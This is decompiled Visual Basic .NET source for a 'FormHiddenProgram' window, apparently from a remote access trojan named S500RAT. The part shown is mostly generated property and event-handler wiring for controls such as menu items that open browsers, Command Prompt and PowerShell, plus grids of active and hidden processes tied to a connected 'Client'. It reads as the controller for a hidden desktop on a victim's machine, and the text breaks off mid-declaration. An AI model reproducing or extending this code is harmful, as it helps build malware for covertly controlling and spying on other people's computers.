Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S.StreamLibrary
Imports S.StreamLibrary.UnsafeCodecs
Imports S500RAT.My.Resources
Imports S500RAT.Server
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200001D RID: 29
	<DesignerGenerated()>
	Public Partial Class FormHiddenProgram
		Inherits Form

		' Token: 0x170001AB RID: 427
		' (get) Token: 0x0600041D RID: 1053 RVA: 0x00026D95 File Offset: 0x00024F95
		' (set) Token: 0x0600041E RID: 1054 RVA: 0x00026DA0 File Offset: 0x00024FA0
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170001AC RID: 428
		' (get) Token: 0x0600041F RID: 1055 RVA: 0x00026DE3 File Offset: 0x00024FE3
		' (set) Token: 0x06000420 RID: 1056 RVA: 0x00026DED File Offset: 0x00024FED
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170001AD RID: 429
		' (get) Token: 0x06000421 RID: 1057 RVA: 0x00026DF6 File Offset: 0x00024FF6
		' (set) Token: 0x06000422 RID: 1058 RVA: 0x00026E00 File Offset: 0x00025000
		Private Overridable Property ClientInfo As Label

		' Token: 0x170001AE RID: 430
		' (get) Token: 0x06000423 RID: 1059 RVA: 0x00026E09 File Offset: 0x00025009
		' (set) Token: 0x06000424 RID: 1060 RVA: 0x00026E13 File Offset: 0x00025013
		Friend Overridable Property Cox As ContextMenuStrip

		' Token: 0x170001AF RID: 431
		' (get) Token: 0x06000425 RID: 1061 RVA: 0x00026E1C File Offset: 0x0002501C
		' (set) Token: 0x06000426 RID: 1062 RVA: 0x00026E28 File Offset: 0x00025028
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				toolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001B0 RID: 432
		' (get) Token: 0x06000427 RID: 1063 RVA: 0x00026E6B File Offset: 0x0002506B
		' (set) Token: 0x06000428 RID: 1064 RVA: 0x00026E78 File Offset: 0x00025078
		Friend Overridable Property ToolStripMenuItem2 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem2_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem2
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem2 = value
				toolStripMenuItem = Me._ToolStripMenuItem2
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001B1 RID: 433
		' (get) Token: 0x06000429 RID: 1065 RVA: 0x00026EBB File Offset: 0x000250BB
		' (set) Token: 0x0600042A RID: 1066 RVA: 0x00026EC5 File Offset: 0x000250C5
		Private Overridable Property Label1 As Label

		' Token: 0x170001B2 RID: 434
		' (get) Token: 0x0600042B RID: 1067 RVA: 0x00026ECE File Offset: 0x000250CE
		' (set) Token: 0x0600042C RID: 1068 RVA: 0x00026ED8 File Offset: 0x000250D8
		Public Overridable Property StateHApp As Label
			<CompilerGenerated()>
			Get
				Return Me._StateHApp
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Dim value2 As EventHandler = AddressOf Me.StateHApp_Click
				Dim stateHApp As Label = Me._StateHApp
				If stateHApp IsNot Nothing Then
					RemoveHandler stateHApp.Click, value2
				End If
				Me._StateHApp = value
				stateHApp = Me._StateHApp
				If stateHApp IsNot Nothing Then
					AddHandler stateHApp.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001B3 RID: 435
		' (get) Token: 0x0600042D RID: 1069 RVA: 0x00026F1B File Offset: 0x0002511B
		' (set) Token: 0x0600042E RID: 1070 RVA: 0x00026F25 File Offset: 0x00025125
		Friend Overridable Property Guna2ResizeBox2 As Guna2ResizeBox

		' Token: 0x170001B4 RID: 436
		' (get) Token: 0x0600042F RID: 1071 RVA: 0x00026F2E File Offset: 0x0002512E
		' (set) Token: 0x06000430 RID: 1072 RVA: 0x00026F38 File Offset: 0x00025138
		Friend Overridable Property miniToolStrip As MenuStrip

		' Token: 0x170001B5 RID: 437
		' (get) Token: 0x06000431 RID: 1073 RVA: 0x00026F41 File Offset: 0x00025141
		' (set) Token: 0x06000432 RID: 1074 RVA: 0x00026F4B File Offset: 0x0002514B
		Friend Overridable Property SetingToolStripMenuItem As ToolStripMenuItem

		' Token: 0x170001B6 RID: 438
		' (get) Token: 0x06000433 RID: 1075 RVA: 0x00026F54 File Offset: 0x00025154
		' (set) Token: 0x06000434 RID: 1076 RVA: 0x00026F5E File Offset: 0x0002515E
		Friend Overridable Property ASDASDToolStripMenuItem As ToolStripMenuItem

		' Token: 0x170001B7 RID: 439
		' (get) Token: 0x06000435 RID: 1077 RVA: 0x00026F67 File Offset: 0x00025167
		' (set) Token: 0x06000436 RID: 1078 RVA: 0x00026F71 File Offset: 0x00025171
		Friend Overridable Property ASDASDToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x170001B8 RID: 440
		' (get) Token: 0x06000437 RID: 1079 RVA: 0x00026F7A File Offset: 0x0002517A
		' (set) Token: 0x06000438 RID: 1080 RVA: 0x00026F84 File Offset: 0x00025184
		Friend Overridable Property ASDASDasdToolStripMenuItem As ToolStripMenuItem

		' Token: 0x170001B9 RID: 441
		' (get) Token: 0x06000439 RID: 1081 RVA: 0x00026F8D File Offset: 0x0002518D
		' (set) Token: 0x0600043A RID: 1082 RVA: 0x00026F97 File Offset: 0x00025197
		Friend Overridable Property DASDAdToolStripMenuItem As ToolStripMenuItem

		' Token: 0x170001BA RID: 442
		' (get) Token: 0x0600043B RID: 1083 RVA: 0x00026FA0 File Offset: 0x000251A0
		' (set) Token: 0x0600043C RID: 1084 RVA: 0x00026FAA File Offset: 0x000251AA
		Friend Overridable Property MenuStrip1 As MenuStrip

		' Token: 0x170001BB RID: 443
		' (get) Token: 0x0600043D RID: 1085 RVA: 0x00026FB3 File Offset: 0x000251B3
		' (set) Token: 0x0600043E RID: 1086 RVA: 0x00026FBD File Offset: 0x000251BD
		Friend Overridable Property ToolStripMenuItem4 As ToolStripMenuItem

		' Token: 0x170001BC RID: 444
		' (get) Token: 0x0600043F RID: 1087 RVA: 0x00026FC6 File Offset: 0x000251C6
		' (set) Token: 0x06000440 RID: 1088 RVA: 0x00026FD0 File Offset: 0x000251D0
		Friend Overridable Property ToolStripMenuItem3 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem3_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem3
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem3 = value
				toolStripMenuItem = Me._ToolStripMenuItem3
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001BD RID: 445
		' (get) Token: 0x06000441 RID: 1089 RVA: 0x00027013 File Offset: 0x00025213
		' (set) Token: 0x06000442 RID: 1090 RVA: 0x00027020 File Offset: 0x00025220
		Friend Overridable Property OpenEdgeBrowser As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._OpenEdgeBrowser
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenEdgeBrowser_Click
				Dim openEdgeBrowser As ToolStripMenuItem = Me._OpenEdgeBrowser
				If openEdgeBrowser IsNot Nothing Then
					RemoveHandler openEdgeBrowser.Click, value2
				End If
				Me._OpenEdgeBrowser = value
				openEdgeBrowser = Me._OpenEdgeBrowser
				If openEdgeBrowser IsNot Nothing Then
					AddHandler openEdgeBrowser.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001BE RID: 446
		' (get) Token: 0x06000443 RID: 1091 RVA: 0x00027063 File Offset: 0x00025263
		' (set) Token: 0x06000444 RID: 1092 RVA: 0x00027070 File Offset: 0x00025270
		Friend Overridable Property OpenChromeBrowser As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._OpenChromeBrowser
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenChromeBrowser_Click
				Dim openChromeBrowser As ToolStripMenuItem = Me._OpenChromeBrowser
				If openChromeBrowser IsNot Nothing Then
					RemoveHandler openChromeBrowser.Click, value2
				End If
				Me._OpenChromeBrowser = value
				openChromeBrowser = Me._OpenChromeBrowser
				If openChromeBrowser IsNot Nothing Then
					AddHandler openChromeBrowser.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001BF RID: 447
		' (get) Token: 0x06000445 RID: 1093 RVA: 0x000270B3 File Offset: 0x000252B3
		' (set) Token: 0x06000446 RID: 1094 RVA: 0x000270C0 File Offset: 0x000252C0
		Friend Overridable Property OpenFireFoxBrowser As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._OpenFireFoxBrowser
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenFireFoxBrowser_Click
				Dim openFireFoxBrowser As ToolStripMenuItem = Me._OpenFireFoxBrowser
				If openFireFoxBrowser IsNot Nothing Then
					RemoveHandler openFireFoxBrowser.Click, value2
				End If
				Me._OpenFireFoxBrowser = value
				openFireFoxBrowser = Me._OpenFireFoxBrowser
				If openFireFoxBrowser IsNot Nothing Then
					AddHandler openFireFoxBrowser.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001C0 RID: 448
		' (get) Token: 0x06000447 RID: 1095 RVA: 0x00027103 File Offset: 0x00025303
		' (set) Token: 0x06000448 RID: 1096 RVA: 0x00027110 File Offset: 0x00025310
		Friend Overridable Property BraveBrowser As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._BraveBrowser
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.BraveBrowser_Click
				Dim braveBrowser As ToolStripMenuItem = Me._BraveBrowser
				If braveBrowser IsNot Nothing Then
					RemoveHandler braveBrowser.Click, value2
				End If
				Me._BraveBrowser = value
				braveBrowser = Me._BraveBrowser
				If braveBrowser IsNot Nothing Then
					AddHandler braveBrowser.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001C1 RID: 449
		' (get) Token: 0x06000449 RID: 1097 RVA: 0x00027153 File Offset: 0x00025353
		' (set) Token: 0x0600044A RID: 1098 RVA: 0x00027160 File Offset: 0x00025360
		Friend Overridable Property CommandPrompt As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CommandPrompt
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CommandPrompt_Click
				Dim commandPrompt As ToolStripMenuItem = Me._CommandPrompt
				If commandPrompt IsNot Nothing Then
					RemoveHandler commandPrompt.Click, value2
				End If
				Me._CommandPrompt = value
				commandPrompt = Me._CommandPrompt
				If commandPrompt IsNot Nothing Then
					AddHandler commandPrompt.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001C2 RID: 450
		' (get) Token: 0x0600044B RID: 1099 RVA: 0x000271A3 File Offset: 0x000253A3
		' (set) Token: 0x0600044C RID: 1100 RVA: 0x000271B0 File Offset: 0x000253B0
		Friend Overridable Property PowerShell As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._PowerShell
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PowerShell_Click
				Dim powerShell As ToolStripMenuItem = Me._PowerShell
				If powerShell IsNot Nothing Then
					RemoveHandler powerShell.Click, value2
				End If
				Me._PowerShell = value
				powerShell = Me._PowerShell
				If powerShell IsNot Nothing Then
					AddHandler powerShell.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001C3 RID: 451
		' (get) Token: 0x0600044D RID: 1101 RVA: 0x000271F3 File Offset: 0x000253F3
		' (set) Token: 0x0600044E RID: 1102 RVA: 0x00027200 File Offset: 0x00025400
		Friend Overridable Property CustomOpen As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CustomOpen
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CustomOpen_Click
				Dim customOpen As ToolStripMenuItem = Me._CustomOpen
				If customOpen IsNot Nothing Then
					RemoveHandler customOpen.Click, value2
				End If
				Me._CustomOpen = value
				customOpen = Me._CustomOpen
				If customOpen IsNot Nothing Then
					AddHandler customOpen.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001C4 RID: 452
		' (get) Token: 0x0600044F RID: 1103 RVA: 0x00027243 File Offset: 0x00025443
		' (set) Token: 0x06000450 RID: 1104 RVA: 0x0002724D File Offset: 0x0002544D
		Friend Overridable Property ToolStripMenuItem13 As ToolStripMenuItem

		' Token: 0x170001C5 RID: 453
		' (get) Token: 0x06000451 RID: 1105 RVA: 0x00027256 File Offset: 0x00025456
		' (set) Token: 0x06000452 RID: 1106 RVA: 0x00027260 File Offset: 0x00025460
		Friend Overridable Property CopyText As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyText
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyText_Click
				Dim copyText As ToolStripMenuItem = Me._CopyText
				If copyText IsNot Nothing Then
					RemoveHandler copyText.Click, value2
				End If
				Me._CopyText = value
				copyText = Me._CopyText
				If copyText IsNot Nothing Then
					AddHandler copyText.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001C6 RID: 454
		' (get) Token: 0x06000453 RID: 1107 RVA: 0x000272A3 File Offset: 0x000254A3
		' (set) Token: 0x06000454 RID: 1108 RVA: 0x000272B0 File Offset: 0x000254B0
		Friend Overridable Property PasteText As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._PasteText
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PasteText_Click
				Dim pasteText As ToolStripMenuItem = Me._PasteText
				If pasteText IsNot Nothing Then
					RemoveHandler pasteText.Click, value2
				End If
				Me._PasteText = value
				pasteText = Me._PasteText
				If pasteText IsNot Nothing Then
					AddHandler pasteText.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001C7 RID: 455
		' (get) Token: 0x06000455 RID: 1109 RVA: 0x000272F3 File Offset: 0x000254F3
		' (set) Token: 0x06000456 RID: 1110 RVA: 0x00027300 File Offset: 0x00025500
		Friend Overridable Property PictureBox1 As PictureBox
			<CompilerGenerated()>
			Get
				Return Me._PictureBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As MouseEventHandler = AddressOf Me.PictureBox1_MouseDown
				Dim value3 As MouseEventHandler = AddressOf Me.PictureBox1_MouseUp
				Dim value4 As MouseEventHandler = AddressOf Me.PictureBox1_MouseMove
				Dim pictureBox As PictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					RemoveHandler pictureBox.MouseDown, value2
					RemoveHandler pictureBox.MouseUp, value3
					RemoveHandler pictureBox.MouseMove, value4
				End If
				Me._PictureBox1 = value
				pictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					AddHandler pictureBox.MouseDown, value2
					AddHandler pictureBox.MouseUp, value3
					AddHandler pictureBox.MouseMove, value4
				End If
			End Set
		End Property

		' Token: 0x170001C8 RID: 456
		' (get) Token: 0x06000457 RID: 1111 RVA: 0x00027379 File Offset: 0x00025579
		' (set) Token: 0x06000458 RID: 1112 RVA: 0x00027383 File Offset: 0x00025583
		Friend Overridable Property ListProcessActive As Guna2DataGridView

		' Token: 0x170001C9 RID: 457
		' (get) Token: 0x06000459 RID: 1113 RVA: 0x0002738C File Offset: 0x0002558C
		' (set) Token: 0x0600045A RID: 1114 RVA: 0x00027396 File Offset: 0x00025596
		Friend Overridable Property ListProcessHidden As Guna2DataGridView

		' Token: 0x170001CA RID: 458
		' (get) Token: 0x0600045B RID: 1115 RVA: 0x0002739F File Offset: 0x0002559F
		' (set) Token: 0x0600045C RID: 1116 RVA: 0x000273A9 File Offset: 0x000255A9
		Friend Overridable Property ElipseListProcess As Guna2Elipse

		' Token: 0x170001CB RID: 459
		' (get) Token: 0x0600045D RID: 1117 RVA: 0x000273B2 File Offset: 0x000255B2
		' (set) Token: 0x0600045E RID: 1118 RVA: 0x000273BC File Offset: 0x000255BC
		Friend Overridable Property Guna2Elipse2 As Guna2Elipse

		' Token: 0x170001CC RID: 460
		' (get) Token: 0x0600045F RID: 1119 RVA: 0x000273C5 File Offset: 0x000255C5
		' (set) Token: 0x06000460 RID: 1120 RVA: 0x000273CF File Offset: 0x000255CF
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x170001CD RID: 461
		' (get) Token: 0x06000461 RID: 1121 RVA: 0x000273D8 File Offset: 0x000255D8
		' (set) Token: 0x06000462 RID: 1122 RVA: 0x000273E4 File Offset: 0x000255E4
		Friend Overridable Property ToolStripMenuItem5 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem5
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem5_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem5
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem5 = value
				toolStripMenuItem = Me._ToolStripMenuItem5
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001CE RID: 462
		' (get) Token: 0x06000463 RID: 1123 RVA: 0x00027427 File Offset: 0x00025627
		' (set) Token: 0x06000464 RID: 1124 RVA: 0x00027434 File Offset: 0x00025634
		Friend Overridable Property RefrshProcessActive As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefrshProcessActive
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefrshProcessActive_Click
				Dim refrshProcessActive As ToolStripMenuItem = Me._RefrshProcessActive
				If refrshProcessActive IsNot Nothing Then
					RemoveHandler refrshProcessActive.Click, value2
				End If
				Me._RefrshProcessActive = value
				refrshProcessActive = Me._RefrshProcessActive
				If refrshProcessActive IsNot Nothing Then
					AddHandler refrshProcessActive.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001CF RID: 463
		' (get) Token: 0x06000465 RID: 1125 RVA: 0x00027477 File Offset: 0x00025677
		' (set) Token: 0x06000466 RID: 1126 RVA: 0x00027484 File Offset: 0x00025684
		Friend Overridable Property ToolStripMenuItem19 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem19
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem19_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem19
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem19 = value
				toolStripMenuItem = Me._ToolStripMenuItem19
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001D0 RID: 464
		' (get) Token: 0x06000467 RID: 1127 RVA: 0x000274C7 File Offset: 0x000256C7
		' (set) Token: 0x06000468 RID: 1128 RVA: 0x000274D1 File Offset: 0x000256D1
		Friend Overridable Property HomePanelLogs As Guna2CustomGradientPanel

		' Token: 0x170001D1 RID: 465
		' (get) Token: 0x06000469 RID: 1129 RVA: 0x000274DA File Offset: 0x000256DA
		' (set) Token: 0x0600046A RID: 1130 RVA: 0x000274E4 File Offset: 0x000256E4
		Friend Overridable Property CountListProcesseActive As UILabel

		' Token: 0x170001D2 RID: 466
		' (get) Token: 0x0600046B RID: 1131 RVA: 0x000274ED File Offset: 0x000256ED
		' (set) Token: 0x0600046C RID: 1132 RVA: 0x000274F7 File Offset: 0x000256F7
		Friend Overridable Property UiLabel6 As UILabel

		' Token: 0x170001D3 RID: 467
		' (get) Token: 0x0600046D RID: 1133 RVA: 0x00027500 File Offset: 0x00025700
		' (set) Token: 0x0600046E RID: 1134 RVA: 0x0002750A File Offset: 0x0002570A
		Friend Overridable Property UiLabel5 As UILabel

		' Token: 0x170001D4 RID: 468
		' (get) Token: 0x0600046F RID: 1135 RVA: 0x00027513 File Offset: 0x00025713
		' (set) Token: 0x06000470 RID: 1136 RVA: 0x0002751D File Offset: 0x0002571D
		Friend Overridable Property Guna2CustomGradientPanel1 As Guna2CustomGradientPanel

		' Token: 0x170001D5 RID: 469
		' (get) Token: 0x06000471 RID: 1137 RVA: 0x00027526 File Offset: 0x00025726
		' (set) Token: 0x06000472 RID: 1138 RVA: 0x00027530 File Offset: 0x00025730
		Friend Overridable Property UiLabel4 As UILabel

		' Token: 0x170001D6 RID: 470
		' (get) Token: 0x06000473 RID: 1139 RVA: 0x00027539 File Offset: 0x00025739
		' (set) Token: 0x06000474 RID: 1140 RVA: 0x00027543 File Offset: 0x00025743
		Private Overridable Property Label2 As Label

		' Token: 0x170001D7 RID: 471
		' (get) Token: 0x06000475 RID: 1141 RVA: 0x0002754C File Offset: 0x0002574C
		' (set) Token: 0x06000476 RID: 1142 RVA: 0x00027556 File Offset: 0x00025756
		Public Overridable Property FPS As Label

		' Token: 0x170001D8 RID: 472
		' (get) Token: 0x06000477 RID: 1143 RVA: 0x0002755F File Offset: 0x0002575F
		' (set) Token: 0x06000478 RID: 1144 RVA: 0x00027569 File Offset: 0x00025769
		Friend Overridable Property CountListProcessHidden As UILabel

		' Token: 0x170001D9 RID: 473
		' (get) Token: 0x06000479 RID: 1145 RVA: 0x00027572 File Offset: 0x00025772
		' (set) Token: 0x0600047A RID: 1146 RVA: 0x0002757C File Offset: 0x0002577C
		Friend Overridable Property UiLabel3 As UILabel

		' Token: 0x170001DA RID: 474
		' (get) Token: 0x0600047B RID: 1147 RVA: 0x00027585 File Offset: 0x00025785
		' (set) Token: 0x0600047C RID: 1148 RVA: 0x0002758F File Offset: 0x0002578F
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x170001DB RID: 475
		' (get) Token: 0x0600047D RID: 1149 RVA: 0x00027598 File Offset: 0x00025798
		' (set) Token: 0x0600047E RID: 1150 RVA: 0x000275A2 File Offset: 0x000257A2
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170001DC RID: 476
		' (get) Token: 0x0600047F RID: 1151 RVA: 0x000275AB File Offset: 0x000257AB
		' (set) Token: 0x06000480 RID: 1152 RVA: 0x000275B5 File Offset: 0x000257B5
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170001DD RID: 477
		' (get) Token: 0x06000481 RID: 1153 RVA: 0x000275BE File Offset: 0x000257BE
		' (set) Token: 0x06000482 RID: 1154 RVA: 0x000275C8 File Offset: 0x000257C8
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001DE RID: 478
		' (get) Token: 0x06000483 RID: 1155 RVA: 0x0002760B File Offset: 0x0002580B
		' (set) Token: 0x06000484 RID: 1156 RVA: 0x00027615 File Offset: 0x00025815
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170001DF RID: 479
		' (get) Token: 0x06000485 RID: 1157 RVA: 0x0002761E File Offset: 0x0002581E
		' (set) Token: 0x06000486 RID: 1158 RVA: 0x00027628 File Offset: 0x00025828
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170001E0 RID: 480
		' (get) Token: 0x06000487 RID: 1159 RVA: 0x00027631 File Offset: 0x00025831
		' (set) Token: 0x06000488 RID: 1160 RVA: 0x0002763B File Offset: 0x0002583B
		Friend Overridable Property Column1 As DataGridViewImageColumn

		' Token: 0x170001E1 RID: 481
		' (get) Token: 0x06000489 RID: 1161 RVA: 0x00027644 File Offset: 0x00025844
		' (set) Token: 0x0600048A RID: 1162 RVA: 0x0002764E File Offset: 0x0002584E
		Friend Overridable Property DataGridViewTextBoxColumn1 As DataGridViewTextBoxColumn

		' Token: 0x170001E2 RID: 482
		' (get) Token: 0x0600048B RID: 1163 RVA: 0x00027657 File Offset: 0x00025857
		' (set) Token: 0x0600048C RID: 1164 RVA: 0x00027661 File Offset: 0x00025861
		Friend Overridable Property Column5 As DataGridViewTextBoxColumn

		' Token: 0x170001E3 RID: 483
		' (get) Token: 0x0600048D RID: 1165 RVA: 0x0002766A File Offset: 0x0002586A
		' (set) Token: 0x0600048E RID: 1166 RVA: 0x00027674 File Offset: 0x00025874
		Friend Overridable Property DataGridViewImageColumn1 As DataGridViewImageColumn

		' Token: 0x170001E4 RID: 484
		' (get) Token: 0x0600048F RID: 1167 RVA: 0x0002767D File Offset: 0x0002587D
		' (set) Token: 0x06000490 RID: 1168 RVA: 0x00027687 File Offset: 0x00025887
		Friend Overridable Property DataGridViewTextBoxColumn2 As DataGridViewTextBoxColumn

		' Token: 0x170001E5 RID: 485
		' (get) Token: 0x06000491 RID: 1169 RVA: 0x00027690 File Offset: 0x00025890
		' (set) Token: 0x06000492 RID: 1170 RVA: 0x0002769A File Offset: 0x0002589A
		Friend Overridable Property DataGridViewTextBoxColumn3 As DataGridViewTextBoxColumn

		' Token: 0x170001E6 RID: 486
		' (get) Token: 0x06000493 RID: 1171 RVA: 0x000276A3 File Offset: 0x000258A3
		' (set) Token: 0x06000494 RID: 1172 RVA: 0x000276AD File Offset: 0x000258AD
		Friend Overridable Property Column2 As DataGridViewTextBoxColumn

		' Token: 0x170001E7 RID: 487
		' (get) Token: 0x06000495 RID: 1173 RVA: 0x000276B6 File Offset: 0x000258B6
		' (set) Token: 0x06000496 RID: 1174 RVA: 0x000276C0 File Offset: 0x000258C0
		Public Property Client As Clients

		' Token: 0x170001E8 RID: 488
		' (get) Token: 0x06000497 RID: 1175 RVA: 0x000276C9 File Offset: 0x000258C9
		' (set) Token: 0x06000498 RID: 1176 RVA: 0x000276D3 File Offset: 0x000258D3
		Public Property F As FormS500

		' Token: 0x170001E9 RID: 489
		' (get) Token: 0x06000499 RID: 1177 RVA: 0x000276DC File Offset: 0x000258DC
		' (set) Token: 0x0600049A RID: 1178 RVA: 0x000276E6 File Offset: 0x000258E6
		Public Property FullPath As String

		' Token: 0x170001EA RID: 490
		' (get) Token: 0x0600049B RID: 1179 RVA: 0x000276EF File Offset: 0x000258EF
